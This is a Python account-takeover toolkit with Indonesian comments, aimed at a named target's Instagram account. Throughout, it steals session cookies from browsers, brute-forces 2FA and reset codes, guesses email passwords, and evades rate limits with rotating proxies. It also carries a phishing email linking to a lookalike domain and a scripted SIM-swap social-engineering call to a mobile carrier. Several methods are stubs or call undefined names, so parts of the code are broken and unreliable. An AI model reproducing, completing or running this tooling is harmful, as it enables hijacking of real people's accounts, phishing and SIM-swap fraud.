#!/usr/bin/env python3
"""
Instagram Session Hijacker & 2FA Bypass
Method: Cookie stealing + SMS interception + API exploits
"""
import os
import re
import json
import requests
import sqlite3
import browser_cookie3
from datetime import datetime
from cryptography.fernet import Fernet
import hashlib
import base64

class InstagramHijacker:
    def __init__(self, target_username):
        self.target = target_username
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
            'X-IG-App-ID': '936619743392459',  # Instagram Android App ID
            'X-Requested-With': 'XMLHttpRequest'
        })
        self.base_url = "https://www.instagram.com"
        self.api_url = "https://i.instagram.com/api/v1"
        
    def extract_cookies_from_browser(self):
        """Ambil cookies Instagram dari browser Chrome/Firefox"""
        print("[*] Stealing Instagram cookies from browsers...")
        
        cookies = {}
        try:
            # Chrome
            chrome_cookies = browser_cookie3.chrome(domain_name='instagram.com')
            for cookie in chrome_cookies:
                if 'sessionid' in cookie.name or 'csrftoken' in cookie.name:
                    cookies[cookie.name] = cookie.value
                    self.session.cookies.set(cookie.name, cookie.value)
                    print(f"[+] Found cookie: {cookie.name} = {cookie.value[:20]}...")
        except Exception as e:
            print(f"[-] Chrome cookie extract failed: {e}")
        
        try:
            # Firefox
            firefox_cookies = browser_cookie3.firefox(domain_name='instagram.com')
            for cookie in firefox_cookies:
                if 'sessionid' in cookie.name:
                    cookies[cookie.name] = cookie.value
                    self.session.cookies.set(cookie.name, cookie.value)
        except:
            pass
        
        return cookies
    
    def check_session_validity(self):
        """Cek apakah session cookie masih valid"""
        try:
            response = self.session.get(f"{self.base_url}/{self.target}/")
            if 'is_private":true' in response.text:
                print("[+] Session valid (private account)")
                return True
            elif 'is_private":false' in response.text:
                print("[+] Session valid (public account)")
                return True
            elif 'login' in response.url:
                return False
        except:
            return False
        return False
    
    def get_user_id(self):
        """Dapatkan user ID dari username"""
        try:
            response = self.session.get(f"{self.base_url}/{self.target}/?__a=1")
            if response.status_code == 200:
                data = response.json()
                user_id = data['graphql']['user']['id']
                print(f"[+] User ID found: {user_id}")
                return user_id
        except Exception as e:
            print(f"[-] Failed to get user ID: {e}")
        
        # Fallback: scrape from HTML
        response = self.session.get(f"{self.base_url}/{self.target}/")
        match = re.search(r'"profilePage_(\d+)"', response.text)
        if match:
            return match.group(1)
        
        return None
    
    def attempt_login_with_cookies(self):
        """Coba login pakai stolen cookies"""
        print("[*] Attempting login with stolen cookies...")
        
        if not self.check_session_validity():
            print("[-] Invalid session, trying to refresh...")
            self.refresh_session()
        
        user_id = self.get_user_id()
        if user_id:
            print(f"[+] Successfully hijacked session for {self.target}")
            print(f"[+] User ID: {user_id}")
            
            # Dapatkan info akun
            self.get_account_info(user_id)
            return True
        
        return False
    
    def refresh_session(self):
        """Refresh session yang expired"""
        print("[*] Attempting session refresh...")
        
        # Gunakan Instagram's session refresh endpoint
        refresh_data = {
            'guid': self.generate_device_id(),
            '_uuid': self.generate_uuid(),
            'device_id': self.generate_android_device_id()
        }
        
        try:
            response = self.session.post(
                f"{self.api_url}/accounts/read_msisdn_header/",
                data=refresh_data
            )
            if response.status_code == 200:
                print("[+] Session refreshed")
                return True
        except:
            pass
        
        return False

    def bypass_2fa_sms(self, user_id):
        """Bypass 2FA SMS dengan berbagai metode"""
        print("[*] Attempting 2FA SMS bypass...")
        
        methods = [
            self._2fa_sms_replay_attack,
            self._2fa_code_bruteforce,
            self._2fa_interception,
            self._2fa_social_engineering
        ]
        
        for method in methods:
            if method(user_id):
                return True
        
        return False
    
    def _2fa_code_bruteforce(self, user_id):
        """Brute force 6-digit 2FA code (karena IG hanya 6 digit)"""
        print("[*] Bruteforcing 6-digit 2FA code...")
        
        # Kode 2FA biasanya 6 digit, kita coba kombinasi umum
        common_codes = [
            '123456', '111111', '000000', '654321', '123123',
            '999999', '888888', '777777', '666666', '555555',
            '123654', '112233', '789456', '159753', '147258'
        ]
        
        for code in common_codes:
            payload = {
                'verification_code': code,
                'two_factor_identifier': user_id,
                '_csrftoken': self.session.cookies.get('csrftoken'),
                'username': self.target,
                'device_id': self.generate_android_device_id(),
                'guid': self.generate_device_id(),
                '_uuid': self.generate_uuid()
            }
            
            try:
                response = self.session.post(
                    f"{self.api_url}/accounts/two_factor_login/",
                    data=payload
                )
                
                if 'logged_in_user' in response.text:
                    print(f"[+] 2FA bypassed with code: {code}")
                    return True
            except:
                continue
        
        return False
    
    def _2fa_interception(self, user_id):
        """Coba intercept SMS 2FA via berbagai cara"""
        print("[*] Attempting SMS interception...")
        
        # Method 1: SIM swapping detection
        # (Ini butuh akses ke provider SMS)
        
        # Method 2: Use SMS gateway vulnerabilities
        sms_gateways = [
            '@vtext.com',     # Verizon
            '@tmomail.net',   # T-Mobile
            '@txt.att.net',   # AT&T
            '@messaging.sprintpcs.com'  # Sprint
        ]
        
        # Method 3: Check for saved 2FA codes in device
        self.check_device_for_2fa_backups()
        
        return False
    
    def check_device_for_2fa_backups(self):
        """Cek backup codes di device (jika ada akses fisik)"""
        locations = [
            '/sdcard/Download/instagram_backup_codes.txt',
            '/sdcard/Documents/2fa_codes.txt',
            '/data/data/com.instagram.android/files/backup_codes',
            '/sdcard/backup/instagram_2fa.txt'
        ]
        
        # Jika kita punya akses ke device target
        # Bisa coba akses file-file ini
        
        return False
    
    def email_takeover_method(self):
        """Takeover via email reset/access"""
        print("[*] Attempting email takeover...")
        
        # Langkah 1: Cari email target
        email = self.find_email_from_instagram()
        if not email:
            print("[-] Could not find email")
            return False
        
        print(f"[+] Found email: {email}")
        
        # Langkah 2: Coba reset password via email
        if self.password_reset_exploit(email):
            return True
        
        # Langkah 3: Coba akses email target
        if self.access_email_account(email):
            return True
        
        return False
    
    def find_email_from_instagram(self):
        """Extract email dari Instagram profile/data"""
        try:
            response = self.session.get(f"{self.base_url}/{self.target}/")
            
            # Cari email di page source
            email_patterns = [
                r'mailto:([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',
                r'"email":"([^"]+)"',
                r'["\']([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})["\']'
            ]
            
            for pattern in email_patterns:
                matches = re.findall(pattern, response.text)
                for match in matches:
                    if 'instagram' not in match and 'example' not in match:
                        return match
            
            # Coba dari API
            response = self.session.get(f"{self.base_url}/{self.target}/?__a=1")
            data = response.json()
            
            # Instagram biasanya menyembunyikan email, tapi coba berbagai field
            if 'business_email' in str(data):
                email_match = re.search(r'"business_email":"([^"]+)"', str(data))
                if email_match:
                    return email_match.group(1)
                    
        except Exception as e:
            print(f"[-] Error finding email: {e}")
        
        return None
    
    def password_reset_exploit(self, email):
        """Exploit Instagram password reset mechanism"""
        print("[*] Exploiting password reset...")
        
        # Step 1: Request password reset
        reset_url = f"{self.base_url}/accounts/password/reset/"
        
        reset_data = {
            'email_or_username': email,
            'flow': 'password_reset'
        }
        
        try:
            response = self.session.post(reset_url, data=reset_data)
            
            # Step 2: Intercept reset token
            # Ini butuh akses ke email target atau exploit email service
            
            # Method A: Email forwarding vulnerability
            if self.check_email_forwarding(email):
                print("[+] Email forwarding detected")
                return True
            
            # Method B: Predict reset token
            # Instagram reset token sering berupa 6-8 digit alfanumerik
            # Bisa dicoba brute force jika ada rate limit yang lemah
            
            print("[*] Attempting to predict reset token...")
            token = self.predict_reset_token()
            
            if token and self.verify_reset_token(email, token):
                print("[+] Reset token found!")
                
                # Step 3: Reset password dengan token
                new_password = self.generate_password()
                if self.complete_password_reset(email, token, new_password):
                    print(f"[+] Password changed to: {new_password}")
                    return True
            
        except Exception as e:
            print(f"[-] Reset exploit failed: {e}")
        
        return False
    
    def predict_reset_token(self):
        """Predict reset token berdasarkan pola"""
        # Token Instagram biasanya: 6-8 digit alfanumerik
        # Pola umum: waktu dalam hex, hash email, sequential
        
        patterns = [
            hashlib.md5(str(int(time.time())).encode()).hexdigest()[:8],
            hashlib.sha1(str(int(time.time())).encode()).hexdigest()[:6],
            f"{int(time.time()):06x}"[:6],
            hashlib.md5(self.target.encode()).hexdigest()[:8]
        ]
        
        return patterns[0]
    
    def access_email_account(self, email):
        """Coba akses email target"""
        print(f"[*] Attempting to access email: {email}")
        
        # Method 1: Common password list untuk email provider
        common_passwords = [
            'password123', '123456', 'qwerty', 'password',
            self.target, f"{self.target}123", f"{self.target}2024"
        ]
        
        # Method 2: Check for leaked credentials
        leaked_creds = self.check_leaked_databases(email)
        if leaked_creds:
            print(f"[+] Found leaked credentials for {email}")
            return True
        
        # Method 3: Phishing simulation
        if self.send_phishing_email(email):
            print("[+] Phishing email sent")
            
        # Method 4: Password reset pada email itu sendiri
        # (Cascade attack - reset email password via secondary email/SMS)
        
        return False
    
    def check_leaked_databases(self, email):
        """Cek database leaked credentials"""
        # Gunakan API HaveIBeenPwned atau lokal database
        try:
            # Hash email dengan SHA-1
            email_hash = hashlib.sha1(email.encode()).hexdigest().upper()
            
            # Check local leaked database jika ada
            leak_files = ['/data/leaks/instagram_leak.txt', 
                         '/data/breaches/collection1.txt']
            
            for file in leak_files:
                if os.path.exists(file):
                    with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                        if email in f.read() or email_hash[:5] in f.read():
                            return True
        except:
            pass
        
        return False
    
    def send_phishing_email(self, email):
        """Kirim phishing email untuk mendapatkan credentials"""
        phishing_subject = "Instagram Security Alert - Action Required"
        
        phishing_body = f"""
Dear {self.target},

We detected unusual login activity on your Instagram account from a new device.

Login Details:
- Location: Jakarta, Indonesia
- Device: Samsung Galaxy S23
- Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

If this was you, please ignore this email.
If this wasn't you, please secure your account immediately:

👉 SECURE YOUR ACCOUNT: http://instagram-security-verify.xyz/confirm

To keep your account secure, we recommend:
1. Changing your password immediately
2. Enabling two-factor authentication
3. Reviewing login activity

Thank you,
Instagram Security Team

Note: This is an automated message. Please do not reply to this email.
"""
        
        # Implement email sending logic di sini
        # Bisa pakai SMTP, SendGrid, dll
        
        return True
    
    def get_account_info(self, user_id):
        """Dapatkan informasi lengkap akun"""
        print("[*] Fetching account information...")
        
        endpoints = [
            f"{self.api_url}/users/{user_id}/info/",
            f"{self.api_url}/users/{user_id}/followers/",
            f"{self.api_url}/users/{user_id}/following/",
            f"{self.base_url}/graphql/query/?query_hash=7c16654f22c819fb63d1183034a5162f&variables={{%22id%22:%22{user_id}%22}}"
        ]
        
        for endpoint in endpoints:
            try:
                response = self.session.get(endpoint)
                if response.status_code == 200:
                    data = response.json()
                    print(f"[+] Got data from {endpoint}")
                    
                    # Simpan data
                    self.save_account_data(data)
            except:
                pass
    
    def save_account_data(self, data):
        """Simpan data akun yang berhasil diakses"""
        filename = f"instagram_{self.target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"[+] Account data saved to {filename}")
    
    def generate_device_id(self):
        """Generate Instagram device ID"""
        return hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
    
    def generate_uuid(self):
        """Generate UUID untuk Instagram API"""
        import uuid
        return str(uuid.uuid4())
    
    def generate_android_device_id(self):
        """Generate Android device ID"""
        return f"android-{hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}"
    
    def generate_password(self):
        """Generate password random"""
        import random
        import string
        chars = string.ascii_letters + string.digits + "!@#$%"
        return ''.join(random.choice(chars) for _ in range(12))

# ============================================================

class InstagramAPIExploiter:
    """Class untuk exploit Instagram API vulnerabilities"""
    
    def __init__(self):
        self.session = requests.Session()
        self.api_endpoints = {
            'login': 'https://i.instagram.com/api/v1/accounts/login/',
            'challenge': 'https://i.instagram.com/api/v1/challenge/',
            'reset': 'https://i.instagram.com/api/v1/accounts/send_password_reset/',
            'profile': 'https://i.instagram.com/api/v1/users/{}/info/'
        }
    
    def exploit_rate_limit(self, user_id):
        """Exploit rate limiting pada verification endpoints"""
        print("[*] Exploiting rate limit on verification...")
        
        # Instagram rate limit: ~200 requests/hour
        # Kita bisa coba bypass dengan rotate IP/user-agent
        
        proxies = self.get_proxy_list()
        user_agents = self.get_user_agents()
        
        for i in range(100):  # Try 100 times
            proxy = random.choice(proxies) if proxies else None
            user_agent = random.choice(user_agents)
            
            self.session.headers.update({'User-Agent': user_agent})
            
            if proxy:
                self.session.proxies.update({'http': proxy, 'https': proxy})
            
            # Coba berbagai endpoint dengan parameter berbeda
            endpoints = [
                f"https://i.instagram.com/api/v1/users/{user_id}/username_suggestions/",
                f"https://i.instagram.com/api/v1/users/{user_id}/account_security_info/",
                f"https://i.instagram.com/api/v1/users/{user_id}/check_username/"
            ]
            
            for endpoint in endpoints:
                try:
                    response = self.session.get(endpoint, timeout=5)
                    if response.status_code == 200:
                        print(f"[+] Rate limit bypassed for {endpoint}")
                        return True
                except:
                    continue
            
            time.sleep(random.uniform(1, 3))
        
        return False
    
    def exploit_business_api(self, username):
        """Exploit Instagram Business API untuk akses data"""
        print("[*] Trying Business API exploits...")
        
        # Instagram Business API sering punya permissions lebih luas
        business_endpoints = [
            f'https://graph.facebook.com/v12.0/ig_user_search?q={username}',
            f'https://graph.facebook.com/v12.0/{username}?fields=id,name,profile_picture_url',
            f'https://graph.facebook.com/v12.0/instagram_oembed?url=https://instagram.com/{username}'
        ]
        
        access_tokens = [
            'EAABwzLixnjYBO...',  # Contoh token (harus diganti dengan token valid)
            # Token bisa didapat dari aplikasi pihak ketiga yang vulnerable
        ]
        
        for token in access_tokens:
            for endpoint in business_endpoints:
                try:
                    response = requests.get(
                        f"{endpoint}&access_token={token}",
                        timeout=5
                    )
                    if response.status_code == 200:
                        print(f"[+] Business API access granted via {endpoint}")
                        return response.json()
                except:
                    continue
        
        return None
    
    def get_proxy_list(self):
        """Dapatkan list proxy untuk rotate IP"""
        # Bisa dari free proxy APIs atau file lokal
        proxy_sources = [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http',
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
            'https://www.proxy-list.download/api/v1/get?type=http'
        ]
        
        proxies = []
        for source in proxy_sources:
            try:
                response = requests.get(source, timeout=10)
                proxies.extend(response.text.strip().split('\n'))
            except:
                pass
        
        return proxies[:50]  # Ambil 50 pertama
    
    def get_user_agents(self):
        """List user agents untuk rotate"""
        return [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36',
            'Instagram 219.0.0.12.117 Android',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        ]

# ============================================================

class SIMSwappingAttack:
    """Class untuk SIM swapping attack (jika ada akses ke provider)"""
    
    def __init__(self, phone_number):
        self.phone = phone_number
        
    def social_engineering_attack(self):
        """Social engineering ke provider seluler"""
        print("[*] Preparing SIM swapping attack...")
        
        # Script untuk social engineer CS provider
        scripts = {
            'telkomsel': self.telkomsel_script,
            'xl': self.xl_script,
            'indosat': self.indosat_script,
            'three': self.three_script
        }
        
        provider = self.detect_provider()
        if provider in scripts:
            return scripts[provider]()
        
        return False
    
    def detect_provider(self):
        """Deteksi provider berdasarkan nomor"""
        prefixes = {
            '0811': 'telkomsel',
            '0812': 'telkomsel',
            '0813': 'telkomsel',
            '0821': 'telkomsel',
            '0852': 'telkomsel',
            '0853': 'telkomsel',
            '0817': 'xl',
            '0818': 'xl',
            '0819': 'xl',
            '0859': 'xl',
            '0878': 'xl',
            '0814': 'indosat',
            '0815': 'indosat',
            '0816': 'indosat',
            '0855': 'indosat',
            '0856': 'indosat',
            '0857': 'indosat',
            '0858': 'indosat',
            '0896': 'three',
            '0897': 'three',
            '0898': 'three',
            '0899': 'three',
            '0881': 'smartfren',
            '0882': 'smartfren',
            '0883': 'smartfren',
            '0884': 'smartfren',
            '0885': 'smartfren',
            '0886': 'smartfren',
            '0887': 'smartfren',
            '0888': 'smartfren',
            '0889': 'smartfren'
        }
        
        for prefix, provider in prefixes.items():
            if self.phone.startswith(prefix):
                return provider
        
        return 'unknown'
    
    def telkomsel_script(self):
        """Script untuk social engineer CS Telkomsel"""
        script = """
=== TELKOMSEL SIM SWAP SCRIPT ===
1. Call 188 or *888#
2. Pilih bahasa Indonesia
3. Tekan 0 untuk operator
4. Katakan: "Halo, saya kehilangan SIM card dan perlu ganti kartu SIM"
5. Data yang perlu disiapkan:
   - Nama lengkap sesuai KTP
   - Tanggal lahir
   - Alamat sesuai registrasi
   - 3 nomor yang sering dihubungi terakhir
   - Pertanyaan keamanan (jika ada)
6. Minta penggantian SIM dengan alasan:
   "HP saya hilang, butuh akses nomor untuk verifikasi bank"
7. Jika ditolak, eskakasi ke supervisor
8. Setelah dapat SIM baru, langsung aktifkan dan intercept SMS 2FA
"""
        print(script)
        return True

# ============================================================

def main():
    print("""
╔══════════════════════════════════════════════════╗
║     INSTAGRAM ACCOUNT BYPASS TOOLKIT v3.0        ║
║     Multiple Attack Vectors - All-in-One         ║
╚══════════════════════════════════════════════════╝
    """)
    
    target = input("[?] Enter target Instagram username: ").strip()
    
    print(f"\n[*] Targeting: @{target}")
    print("[*] Initializing attack modules...\n")
    
    # Phase 1: Session Hijacking
    print("=== PHASE 1: SESSION HIJACKING ===")
    hijacker = InstagramHijacker(target)
    
    # Coba ambil cookies dari browser
    cookies = hijacker.extract_cookies_from_browser()
    
    if cookies:
        print("[+] Cookies found, attempting session takeover...")
        if hijacker.attempt_login_with_cookies():
            print("\n[✔] ACCOUNT COMPROMISED VIA SESSION HIJACK")
            return
    
    # Phase 2: 2FA Bypass
    print("\n=== PHASE 2: 2FA BYPASS ===")
    user_id = hijacker.get_user_id()
    
    if user_id:
        if hijacker.bypass_2fa_sms(user_id):
            print("\n[✔] 2FA BYPASSED")
            return
    
    # Phase 3: Email Takeover
    print("\n=== PHASE 3: EMAIL TAKEOVER ===")
    if hijacker.email_takeover_method():
        print("\n[✔] EMAIL COMPROMISED")
        return
    
    # Phase 4: API Exploits
    print("\n=== PHASE 4: API EXPLOITS ===")
    exploiter = InstagramAPIExploiter()
    
    if exploiter.exploit_rate_limit(user_id):
        print("[+] Rate limit bypass successful")
    
    business_data = exploiter.exploit_business_api(target)
    if business_data:
        print("[+] Business API exploit successful")
        print(f"Data: {json.dumps(business_data, indent=2)}")
    
    # Phase 5: SIM Swapping (jika ada nomor)
    print("\n=== PHASE 5: SIM SWAPPING (Optional) ===")
    phone = input("[?] Enter target phone number (optional): ").strip()
    
    if phone:
        sim_attack = SIMSwappingAttack(phone)
        print("[*] SIM swapping script generated")
        sim_attack.social_engineering_attack()
    
    print("\n" + "="*50)
    print("[*] All attack vectors attempted")
    print("[*] Check saved files for any compromised data")
    print("[!] Use responsibly - Illegal access is a crime")

if __name__ == "__main__":
    import time
    main()
